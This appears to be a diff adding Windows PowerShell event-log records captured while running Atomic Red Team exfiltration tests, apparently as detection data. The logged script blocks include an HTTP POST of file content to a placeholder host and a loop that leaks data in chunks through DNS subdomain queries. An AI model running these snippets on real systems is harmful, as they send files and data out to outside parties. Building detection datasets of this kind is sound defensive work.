@@ -1,0 +1,79 @@
+Atomic Test #1 - C2 Data Exfiltration
+
+Log1
+10/02/2024 11:41:10 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3342
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive
+
+ScriptBlock ID: b222da0b-b43d-4c01-bd6f-5092e40a94ad
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1041\T1041_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 11:41:10 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3336
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 
+  1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }
+}
+
+ScriptBlock ID: c6124253-3ddb-4605-a591-1c1ac7a9b3b4
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1041\T1041_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+
+Atomic Test #2 - Text Based Data Exfiltration using DNS subdomains
+
+Log1
+10/02/2024 11:42:08 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3366
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+foreach ($chunk in $chunks) {
+    $dnsQuery = $chunk + "." + $dnsServer
+    Resolve-DnsName -Name $dnsQuery
+    Start-Sleep -Seconds 5
+}
+
+ScriptBlock ID: 66ec5254-c6e0-49d6-8a8b-5c20f9d23805
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1041\T1041_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
